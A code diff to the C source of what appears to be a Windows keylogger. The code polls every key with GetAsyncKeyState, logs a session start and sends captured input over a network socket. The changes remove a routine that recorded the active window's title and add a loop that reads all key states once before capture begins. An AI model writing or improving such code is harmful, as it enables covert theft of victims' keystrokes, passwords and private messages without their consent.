@@ -23,7 +23,7 @@ void setSessionStartLog() {
     memset(string_buffer, 0, 256);
 
 
-#if defined PLATFORM_WINDOWS
+    #if defined PLATFORM_WINDOWS
         platform = "WINDOWS";
         codec = "unicode";
     #endif
@@ -62,28 +62,6 @@ void setSessionEndLog() {
 
 #if defined PLATFORM_WINDOWS
     #include <windows.h>
-    #define BUFLEN 4096
-
-    HWND wincurrent, winlast;
-    unsigned char buffer[BUFLEN];
-
-    void searchActiveWindow(void) {
-        wincurrent = GetForegroundWindow();
-        if(wincurrent != winlast) {
-            winlast = wincurrent;
-            int err = GetWindowText(wincurrent, string_buffer, 256); /* primo metodo */
-            if(err != 0) {
-                if(strlen(string_buffer) == 0) sprintf(buffer, "\r\n[>>> ??? <<<]");
-                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string_buffer);
-            }
-             /* non ha funzionato... secondo metodo */
-            else {
-                SendMessage(wincurrent, WM_GETTEXT, (WPARAM)256, (LPARAM)string_buffer);
-                if(strlen(string_buffer) == 0) sprintf(buffer, "\r\n[>>> ??? <<<]");
-                else sprintf(buffer, "\r\n[>>> %.256s <<<]", string_buffer);
-            }
-        }
-    }
 
     void convert(int keycode) {
         if((keycode>=0x30)&&(keycode<=0x39)) { /* numbers */
@@ -145,6 +123,10 @@ void setSessionEndLog() {
         setSessionStartLog();
         send(s , string_buffer, strlen(string_buffer), 0);
 
+        for (int i = 0; i < 256; i++) {
+            char key = GetAsyncKeyState(i);
+        }
+
         while(running) {
             for (int i = 0; i < 256; i++) {
                 char key = GetAsyncKeyState(i);
@@ -154,7 +136,6 @@ void setSessionEndLog() {
                     break;
                 }
             }
-            searchActiveWindow();
             Sleep(10);
         }
 
@@ -178,7 +159,6 @@ void setSessionEndLog() {
                     break;
                 }
             }
-            searchActiveWindow();
 
             /* previene la saturazione della CPU */
             Sleep(10);
